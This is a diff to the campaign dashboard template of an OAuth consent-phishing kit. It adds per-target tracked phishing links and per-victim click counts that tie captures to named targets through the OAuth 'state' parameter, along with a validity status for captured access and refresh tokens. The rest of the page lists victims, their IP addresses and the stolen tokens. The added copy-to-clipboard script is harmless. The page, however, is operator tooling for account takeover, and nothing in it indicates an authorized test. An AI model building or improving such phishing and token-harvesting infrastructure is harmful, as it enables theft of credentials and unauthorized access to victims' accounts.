@@ -16,7 +16,7 @@
                         <h5>Campaign Info</h5>
                         <p><strong>Name:</strong> {{ campaign.name }}</p>
                         <p><strong>Description:</strong> {{ campaign.description or 'N/A' }}</p>
-                        <p><strong>Status:</strong> 
+                        <p><strong>Status:</strong>
                             {% if campaign.status == 'active' %}
                                 <span class="badge bg-success">Active</span>
                             {% elif campaign.status == 'paused' %}
@@ -25,13 +25,14 @@
                                 <span class="badge bg-secondary">{{ campaign.status }}</span>
                             {% endif %}
                         </p>
-                        <p><strong>Created:</strong> {{ campaign.created_at.strftime('%Y-%m-%d %H:%M') }}</p>
+                        <p><strong>Redirect URI:</strong> {{ campaign.redirect_uri or 'Not set' }}</p>
+                        <p><strong>Created:</strong> {{ campaign.created_at.strftime('%Y-%m-%d %H:%M') if campaign.created_at }}</p>
                     </div>
                     <div class="col-md-6">
-                        <h5>Phishing Link</h5>
+                        <h5>Generic Phishing Link</h5>
                         <div class="input-group">
                             <input type="text" class="form-control" id="phishingUrl" value="{{ campaign.phishing_url }}" readonly>
-                            <button class="btn btn-outline-primary" onclick="copyUrl()">
+                            <button class="btn btn-outline-primary" onclick="copyField('phishingUrl')">
                                 <i class="fas fa-copy"></i>
                             </button>
                         </div>
@@ -41,6 +42,45 @@
                         <div id="qrContainer" class="mt-2" style="display:none;">
                             <img id="qrImage" src="" alt="QR Code">
                         </div>
+
+                        <hr>
+                        <h5>Per-Target Tracked Links</h5>
+                        <p class="text-muted small">
+                            Each target gets a unique link. Clicks are counted per target, and the
+                            OAuth <code>state</code> parameter ties each capture back to the exact target.
+                        </p>
+                        <form method="POST" action="{{ url_for('add_target', campaign_id=campaign.id) }}" class="d-flex gap-2">
+                            <input type="text" class="form-control" name="label" placeholder="Target label (e.g. alice@corp)" required>
+                            <button type="submit" class="btn btn-primary text-nowrap">
+                                <i class="fas fa-link"></i> Generate
+                            </button>
+                        </form>
+                        {% if victims %}
+                        <table class="table table-sm mt-2">
+                            <thead>
+                                <tr><th>Target</th><th>Clicks</th><th>Link</th></tr>
+                            </thead>
+                            <tbody>
+                                {% for victim in victims %}
+                                {% if victim.tracking_id %}
+                                <tr>
+                                    <td>{{ victim.label or victim.email or 'Unknown' }}</td>
+                                    <td>{{ victim.clicks }}</td>
+                                    <td style="max-width: 260px;">
+                                        <div class="input-group input-group-sm">
+                                            <input type="text" class="form-control" id="track-{{ victim.id }}"
+                                                   value="{{ request.host_url }}link/{{ victim.tracking_id }}" readonly>
+                                            <button class="btn btn-outline-primary" onclick="copyField('track-{{ victim.id }}')">
+                                                <i class="fas fa-copy"></i>
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+                                {% endif %}
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                        {% endif %}
                     </div>
                 </div>
                 <hr>
@@ -51,6 +91,7 @@
                             <tr>
                                 <th>Email</th>
                                 <th>IP</th>
+                                <th>Clicks</th>
                                 <th>Status</th>
                                 <th>First Seen</th>
                             </tr>
@@ -58,8 +99,9 @@
                         <tbody>
                             {% for victim in victims %}
                             <tr>
-                                <td>{{ victim.email or 'Unknown' }}</td>
+                                <td>{{ victim.label or victim.email or 'Unknown' }}</td>
                                 <td>{{ victim.ip_address or 'N/A' }}</td>
+                                <td>{{ victim.clicks }}</td>
                                 <td>
                                     {% if victim.status == 'authorized' %}
                                         <span class="badge bg-success">Authorized</span>
@@ -67,10 +109,10 @@
                                         <span class="badge bg-warning">{{ victim.status }}</span>
                                     {% endif %}
                                 </td>
-                                <td>{{ victim.first_seen.strftime('%Y-%m-%d %H:%M') }}</td>
+                                <td>{{ victim.first_seen.strftime('%Y-%m-%d %H:%M') if victim.first_seen }}</td>
                             </tr>
                             {% else %}
-                            <tr><td colspan="4" class="text-center text-muted">No victims</td></tr>
+                            <tr><td colspan="5" class="text-center text-muted">No victims</td></tr>
                             {% endfor %}
                         </tbody>
                     </table>
@@ -85,6 +127,7 @@
                                 <th>Victim</th>
                                 <th>Access Token</th>
                                 <th>Refresh Token</th>
+                                <th>Status</th>
                                 <th>Captured</th>
                             </tr>
                         </thead>
@@ -94,7 +137,7 @@
                                 <td>{{ token.id }}</td>
                                 <td>
                                     {% if token.victim %}
-                                        {{ token.victim.email or 'Unknown' }}
+                                        {{ token.victim.label or token.victim.email or 'Unknown' }}
                                     {% else %}
                                         N/A
                                     {% endif %}
@@ -107,10 +150,19 @@
                                         <span class="badge bg-secondary">No</span>
                                     {% endif %}
                                 </td>
-                                <td>{{ token.captured_at.strftime('%Y-%m-%d %H:%M') }}</td>
+                                <td>
+                                    {% if token.status == 'valid' %}
+                                        <span class="badge bg-success">valid</span>
+                                    {% elif token.status == 'dead' %}
+                                        <span class="badge bg-danger">dead</span>
+                                    {% else %}
+                                        <span class="badge bg-warning">unknown</span>
+                                    {% endif %}
+                                </td>
+                                <td>{{ token.captured_at.strftime('%Y-%m-%d %H:%M') if token.captured_at }}</td>
                             </tr>
                             {% else %}
-                            <tr><td colspan="5" class="text-center text-muted">No tokens captured</td></tr>
+                            <tr><td colspan="6" class="text-center text-muted">No tokens captured</td></tr>
                             {% endfor %}
                         </tbody>
                     </table>
@@ -123,11 +175,32 @@
 
 {% block extra_js %}
 <script>
-function copyUrl() {
-    const url = document.getElementById('phishingUrl');
-    url.select();
-    document.execCommand('copy');
-    alert('URL copied!');
+function copyField(elementId) {
+    const el = document.getElementById(elementId);
+    if (!el || !el.value) { return; }
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(el.value)
+            .then(() => alert('Copied!'))
+            .catch(() => fallbackCopy(el.value));
+    } else {
+        fallbackCopy(el.value);
+    }
+}
+
+function fallbackCopy(text) {
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    textarea.style.left = '-9999px';
+    document.body.appendChild(textarea);
+    textarea.select();
+    try {
+        document.execCommand('copy');
+        alert('Copied!');
+    } catch (e) {
+        alert('Copy failed - please copy manually.');
+    }
+    document.body.removeChild(textarea);
 }
 
 function generateQR(campaignId) {
@@ -138,7 +211,8 @@ function generateQR(campaignId) {
                 document.getElementById('qrImage').src = 'data:image/png;base64,' + data.qr_code;
                 document.getElementById('qrContainer').style.display = 'block';
             }
-        });
+        })
+        .catch(() => alert('Failed to generate QR code'));
 }
 </script>
 {% endblock %}
